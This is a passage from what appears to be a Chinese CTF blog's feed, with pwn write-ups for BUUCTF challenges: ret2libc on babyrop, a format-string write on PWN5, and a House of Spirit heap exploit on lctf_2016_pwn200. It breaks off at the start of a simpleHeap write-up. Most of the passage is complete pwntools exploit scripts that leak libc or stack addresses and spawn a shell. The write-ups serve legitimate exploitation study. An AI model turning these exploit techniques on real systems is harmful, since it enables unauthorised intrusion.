class="hljs-string">&quot;%ld&quot;</span>, a1);<br>  v6 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x20</span>u);                     <span class="hljs-comment">// 存在溢出，buf紧挨着v5，可以修改v5的值大于127</span><br>  buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  v1 = <span class="hljs-built_in">strlen</span>(buf);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strncmp</span>(buf, &amp;s, v1) )                   <span class="hljs-comment">// &#x27;\x00&#x27;开头来绕过strncmp</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Correct\n&quot;</span>, <span class="hljs-number">8u</span>);<br>  <span class="hljs-keyword">return</span> v5;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后在这里实现retlibc:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> __cdecl <span class="hljs-title">sub_80487D0</span><span class="hljs-params">(<span class="hljs-keyword">char</span> a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">ssize_t</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+11h] [ebp-E7h]</span><br><br>  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">127</span> )<br>    result = read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0xC8</span>u);<br>  <span class="hljs-keyword">else</span><br>    result = read(<span class="hljs-number">0</span>, &amp;buf, a1);  <span class="hljs-comment">//溢出</span><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;26338&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./[OGeek2019]babyrop&#x27;</span>)<br><br>main = <span class="hljs-number">0x08048825</span><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload1 = <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">&#x27;\xff&#x27;</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;Correct\n&#x27;</span>)<br><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span> + p32(write_plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">5</span>)<br><br>p.sendline(payload2)<br>write_addr = u32(p.recv()[:<span class="hljs-number">4</span>])<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br>libcbase = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;Correct\n&#x27;</span>)<br><br>payload3 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span> + p32(system_addr) + p32(<span class="hljs-number">0xdeafbeef</span>) + p32(binsh_addr)<br>p.sendline(payload3)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="0x7-第五空间2019-决赛-PWN5"><a href="#0x7-第五空间2019-决赛-PWN5" class="headerlink" title="0x7 [第五空间2019 决赛]PWN5"></a>0x7 [第五空间2019 决赛]PWN5</h2><p>程序伪码：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// ST14_4</span><br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// et1</span><br>  <span class="hljs-keyword">char</span> nptr; <span class="hljs-comment">// [esp+4h] [ebp-80h]</span><br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+14h] [ebp-70h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp+78h] [ebp-Ch]</span><br>  <span class="hljs-keyword">int</span> *v9; <span class="hljs-comment">// [esp+7Ch] [ebp-8h]</span><br><br>  v9 = &amp;a1;<br>  v8 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v1 = time(<span class="hljs-number">0</span>);<br>  srand(v1);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  read(fd, &amp;unk_804C044, <span class="hljs-number">4u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x63</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(&amp;buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;nptr, <span class="hljs-number">0xF</span>u);<br>  <span class="hljs-keyword">if</span> ( atoi(&amp;nptr) == unk_804C044 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>  &#125;<br>  result = <span class="hljs-number">0</span>;<br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  v4 = v5 ^ v8;<br>  <span class="hljs-keyword">if</span> ( v5 != v8 )<br>    sub_80493D0(v4);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>格式化字符串，先看一下输入的aaaa在栈上位置的偏移量：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Bash">$ ./pwn5<br>your name:aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.<br>Hello,aaaa0xffdfa508.0x63.(nil).0xf7f31a9c.0x3.0xf7f03410.0x1.(nil).0x1.0x61616161.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.<br>����your passwd:<br></code></pre></div></td></tr></table></figure><p>可以看到在第10个的位置，可以利用格式化字符串将指定数值写到指定地址，payload一般构造如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">...[overwrite addr]....%[overwrite offset]$n<br></code></pre></div></td></tr></table></figure><p>这样可以将全局变量改写为4，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding: UTF-8 -*- </span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,&#x27;26236&#x27;)</span><br>p = process(<span class="hljs-string">&#x27;./pwn5&#x27;</span>)<br>fd = <span class="hljs-number">0x0804C044</span><br><span class="hljs-comment"># 随机数被修改为4，p32为4位</span><br>payload = p32(fd) + <span class="hljs-string">&#x27;%10$n&#x27;</span> <br>p.recvuntil(<span class="hljs-string">&quot;your name:&quot;</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;your passwd:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="0x8-get-started-3dsctf-2016"><a href="#0x8-get-started-3dsctf-2016" class="headerlink" title="0x8 get_started_3dsctf_2016"></a>0x8 get_started_3dsctf_2016</h2><p>这篇写过详细的<a href="https://iceyup.xyz/2021/01/25/get_started_3dsctf_2016/">writeup</a></p><h2 id="0x9-ciscn-2019-en-2"><a href="#0x9-ciscn-2019-en-2" class="headerlink" title="0x9 ciscn_2019_en_2"></a>0x9 ciscn_2019_en_2</h2><p>解法同 ciscn_2019_c_1</p><h2 id="0xa"><a href="#0xa" class="headerlink" title="0xa"></a>0xa</h2><p>剩下的后面争取一天补一篇，还有就是堆要继续学，勤写博客，题争取时间多刷</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Spirit学习</title>
    <link href="/2021/03/20/House%20of%20Spirit%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/03/20/House%20of%20Spirit%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>House of Spirit是组合型的漏洞利用，它是指针覆盖和堆管理机制的组合利用。该技术的核心在于在目标位置处伪造fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的chunk的目的。<br>要构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表中，需要绕过一些必要的检测，即：</p><ul><li>fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <strong>2 * SIZE_SZ</strong>，同时也不能大于<strong>av-&gt;system_mem</strong> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><hr><h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><ul><li>想要利用的目标区域的前段空间和后段空间都是可控的区域。<strong>一般来说想要控制的区域多为返回地址或函数指针，正常情况下，该内存区域我们是无法通过输入数据来进行控制的，为了利用hos技术来改写该区域，我们需要前段空间和后段空间均可控。</strong></li><li>存在堆变量指针覆盖指向可控区域</li></ul><table><thead><tr><th>HOS</th></tr></thead><tbody><tr><td>前段空间</td></tr><tr><td><strong>目标区域</strong></td></tr><tr><td>后段空间</td></tr></tbody></table><hr><h1 id="例题：lctf-2016-pwn200"><a href="#例题：lctf-2016-pwn200" class="headerlink" title="例题：lctf_2016_pwn200"></a>例题：lctf_2016_pwn200</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/checksec.png"><br>关闭了栈不可执行，可以写入shellcode。</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><h3 id="welcome函数"><a href="#welcome函数" class="headerlink" title="welcome函数"></a>welcome函数</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/welcome.png"><br>这里存在off-by-one漏洞，如果输入48个字符，printf不会检测到 <strong>\x00</strong> 的存在，而v2紧接着就是rbp，可以泄露rbp地址。</p><h3 id="input-money-and-menu函数"><a href="#input-money-and-menu函数" class="headerlink" title="input_money_and_menu函数"></a>input_money_and_menu函数</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/moneyR.png"><br>先申请0x40大小的内存空间，并将malloc指针赋给dest；再向缓冲区读入内容，并将内容复制到dest指向的内存中，最后将dest指针赋给全局变量ptr。<br>这里buf和dest存在<strong>相邻变量覆盖</strong>，输入buf的内容会将dest覆盖掉。如下图所示：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/buf_and_dest7.png"></p><h3 id="heap-management函数"><a href="#heap-management函数" class="headerlink" title="heap_management函数"></a>heap_management函数</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/heap_mana.png"></p><ul><li>1.check in</li><li>2.check out</li><li>3.goodbye</li></ul><h4 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h4><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/in.png"><br>会先检查ptr是否为空，如果不为空，会根据输入的大小和内容创建一个新的堆块</p><h4 id="check-out"><a href="#check-out" class="headerlink" title="check out"></a>check out</h4><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/out.png"><br>释放堆块并置NULL</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="栈帧的具体情况如下："><a href="#栈帧的具体情况如下：" class="headerlink" title="栈帧的具体情况如下："></a>栈帧的具体情况如下：</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>input_money_and_menu栈帧</strong></td><td><strong>buf</strong></td></tr><tr><td></td><td><strong>buf</strong></td></tr><tr><td></td><td><strong>dest</strong></td></tr><tr><td></td><td><strong>old rbp</strong></td></tr><tr><td><strong>welcome栈帧</strong></td><td><strong>input_money_and_menu ret</strong></td></tr><tr><td></td><td>……</td></tr><tr><td></td><td><strong>id</strong></td></tr><tr><td></td><td><strong>v2(name)</strong></td></tr><tr><td></td><td><strong>old rbp</strong></td></tr><tr><td><strong>main栈帧</strong></td><td><strong>welcome ret</strong></td></tr><tr><td></td><td><strong>…</strong></td></tr><tr><td></td><td><strong>old rbp</strong></td></tr><tr><td><strong>start栈帧</strong></td><td><strong>main ret</strong></td></tr></tbody></table><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>在输入name的时候，将shellcode部署在name的位置，并调整好填充大小，以便泄露rbp地址</li><li>得到rbp地址后可以得到栈上的地址，shellcode和fake_chunk的地址就可以根据偏移得到</li><li>在输入buf的时候部署好fake chunk，同时注意绕过条件，并利用相邻地址覆盖将dest覆盖为fake chunk的地址，这样ptr也指向了fake chunk。这里fake chunk的大小要包括rbp和<strong>input_money_and_menu ret</strong>，方便后续修改</li><li>check out释放fake chunk，然后check in申请一个堆块，这样rbp和<strong>input_money_and_menu ret</strong>就可以为我们所用了，将shellcode addr写入ret，退出程序时就可以<strong>getshell</strong></li></ul><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">ru(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>payload = shellcode<br>payload = payload.ljust(<span class="hljs-number">0x30</span>)<br>s(payload)<br>ru(payload)<br><br>leak_addr = u64(r(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;rbp: 0x%x&#x27;</span> % leak_addr)<br><br>ru(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;32&#x27;</span>)<br><br>shellcode_addr = leak_addr - <span class="hljs-number">0x50</span><br>fake_chunk_addr = leak_addr - <span class="hljs-number">0x90</span><br>ru(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><span class="hljs-comment"># payload = p64(0)*4 + p64(0) + p64(0x41) + p64(0) + p64(fake_chunk_addr)</span><br>payload = <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span><br>s(payload)<br>debug()<br></code></pre></div></td></tr></table></figure><p>leak得到rbp地址后，看下shellcode和要部署的fake chunk的data段地址的偏移：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/offsetR.png"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode_addr = leak_addr - <span class="hljs-number">0x50</span><br>fake_chunk_addr = leak_addr - <span class="hljs-number">0x90</span><br></code></pre></div></td></tr></table></figure><p>后面就不难了，按照利用思路一步一步走就可以了（其实是懒得写了XD</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>binary = <span class="hljs-string">&#x27;./lctf_2016_pwn200&#x27;</span><br>context.binary = binary<br>elf = ELF(binary,checksec=<span class="hljs-literal">False</span>)<br>shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">if</span> args[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;r&#x27;</span> <span class="hljs-keyword">else</span> process(binary) <br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    <span class="hljs-comment"># gdb.attach(p)</span><br>    <span class="hljs-comment"># raw_input(&#x27;en..&#x27;)</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;pid &quot;</span> + <span class="hljs-built_in">str</span>(proc.pidof(p))<br>    raw_input(<span class="hljs-string">&quot;attach me&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    ru(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>    payload = shellcode<br>    payload = payload.ljust(<span class="hljs-number">0x30</span>)<br>    s(payload)<br>    ru(payload)<br><br>    leak_addr = u64(r(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    log.success(<span class="hljs-string">&#x27;rbp: 0x%x&#x27;</span> % leak_addr)<br><br>    ru(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;32&#x27;</span>)<br><br>    shellcode_addr = leak_addr - <span class="hljs-number">0x50</span><br>    fake_chunk_addr = leak_addr - <span class="hljs-number">0x90</span><br>    ru(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br>    payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk_addr)<br>    s(payload)<br><br>    ru(<span class="hljs-string">&#x27;\n=======EASY HOTEL========\n1. check in\n2. check out\n3. goodbye\nyour choice : &#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br><br>    ru(<span class="hljs-string">&#x27;\n=======EASY HOTEL========\n1. check in\n2. check out\n3. goodbye\nyour choice : &#x27;</span>)<br>    sl(<span class="hljs-number">1</span>)<br><br>    ru(<span class="hljs-string">&#x27;how long?\n&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;48&#x27;</span>)<br>    p.recvline(<span class="hljs-string">&#x27;48&#x27;</span>)<br>    payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)<br>    payload = payload.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    s(payload)<br>    <span class="hljs-comment"># debug()</span><br><br>    ru(<span class="hljs-string">&#x27;\n=======EASY HOTEL========\n1. check in\n2. check out\n3. goodbye\nyour choice : &#x27;</span>)<br>    sl(<span class="hljs-number">3</span>)<br>    p.interactive()<br>    <span class="hljs-comment"># debug()</span><br><br>exp()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>二进制漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>V&amp;N2020 公开赛 simpleHeap</title>
    <link href="/2021/03/14/%5BV&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/"/>
    <url>/2021/03/14/%5BV&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/</url>
    
    <content type="html"><![CDATA[<p>这一题涉及到的知识点比较多，包括off-by-one，unsorted_bin attach和fast_bin attach，还有通过使用realloc调整栈帧来使one_gadget满足条件。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h3><p>保护全开，按目前学习的体会，大概就是要伪造fake chunk来修改malloc_hook。<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/checksce.png"></p><h3 id="IDA反汇编分析"><a href="#IDA反汇编分析" class="headerlink" title="IDA反汇编分析"></a>IDA反汇编分析</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/menu.png"><br>完整的菜单，有添加、编辑、打印和删除四个功能</p><p>add函数：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/add.png"><br>先读入size，然后对size有大小的检查，通过检查会将分配chunk的malloc指针赋给chunk_list数组。然后将size的值存入size_list数组中，并读入内容。</p><p>edit函数<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/edit.png"><br>重点在my_read函数，在这里存在off-by-one漏洞：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/my_read.png"><br>在i和a2大小的比较那里应该是i&gt;=a2，否则编辑时会多写入一个字符，造成off-by-one</p><p>show函数<br>简单的打印<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/show.png"></p><p>delete函数<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/delete.png"><br>将chunk释放后，将malloc指针置空，同时size大小置为0</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用off-by-one漏洞修改堆块大小，实现overlapping，然后释放到unsorted 